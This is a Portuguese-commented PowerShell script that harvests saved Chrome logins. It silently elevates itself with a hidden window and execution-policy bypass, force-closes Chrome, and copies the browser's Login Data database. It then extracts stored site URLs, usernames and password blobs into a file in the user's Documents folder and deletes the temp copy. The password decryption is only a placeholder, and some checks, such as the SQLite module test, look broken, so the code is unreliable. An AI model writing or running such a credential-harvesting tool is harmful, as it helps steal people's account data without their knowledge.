# ExtrairSenhas.ps1 - Versão com acesso direto ao banco de dados

if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`"" -Verb RunAs -WindowStyle Hidden
    exit
}

$pastaDocuments = [Environment]::GetFolderPath("MyDocuments")
$datahora = Get-Date -Format "yyyyMMdd_HHmmss"
$arquivoSaida = Join-Path $pastaDocuments "senhas_chrome_$datahora.txt"

# Caminho do banco de dados de senhas do Chrome
$loginDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

if (-not (Test-Path $loginDataPath)) {
    "Arquivo de senhas do Chrome nao encontrado!" | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "Chrome sem senhas salvas ou nao instalado." -ForegroundColor Yellow
    exit
}

# Fecha o Chrome para liberar o banco de dados
Get-Process "chrome" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 2

# Copia o banco de dados para um local temporário
$tempDb = "$env:TEMP\login_data_$datahora.db"
Copy-Item $loginDataPath $tempDb -Force

# Carrega a biblioteca necessária
Add-Type -AssemblyName System.Data.SQLite -ErrorAction SilentlyContinue
if (-not (Get-Module -ListAvailable -Name System.Data.SQLite)) {
    "ERRO: Biblioteca SQLite necessaria nao encontrada." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "Biblioteca SQLite nao encontrada." -ForegroundColor Red
    exit
}

# Conecta ao banco de dados e extrai as senhas criptografadas
$conn = New-Object -TypeName System.Data.SQLite.SQLiteConnection
$conn.ConnectionString = "Data Source=$tempDb"
$conn.Open()

$cmd = $conn.CreateCommand()
$cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins"

$reader = $cmd.ExecuteReader()
$resultados = @()

while ($reader.Read()) {
    $url = $reader.GetString(0)
    $username = $reader.GetString(1)
    $passwordBlob = $reader.GetValue(2)
    
    if ($passwordBlob -and $passwordBlob.Length -gt 0) {
        $resultados += [PSCustomObject]@{
            URL = $url
            Usuario = $username
            SenhaCriptografada = "[CRIPTOGRAFADO - Chrome v20]"
        }
    }
}

$reader.Close()
$conn.Close()

# Salva os resultados
if ($resultados.Count -gt 0) {
    $resultados | Format-Table -AutoSize | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "SUCESSO! $($resultados.Count) entradas encontradas em: $arquivoSaida" -ForegroundColor Green
} else {
    "Nenhuma senha encontrada no Chrome." | Out-File -FilePath $arquivoSaida -Encoding UTF8
    Write-Host "Nenhuma senha encontrada." -ForegroundColor Yellow
}

# Limpeza
Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
Start-Sleep -Seconds 1
exit
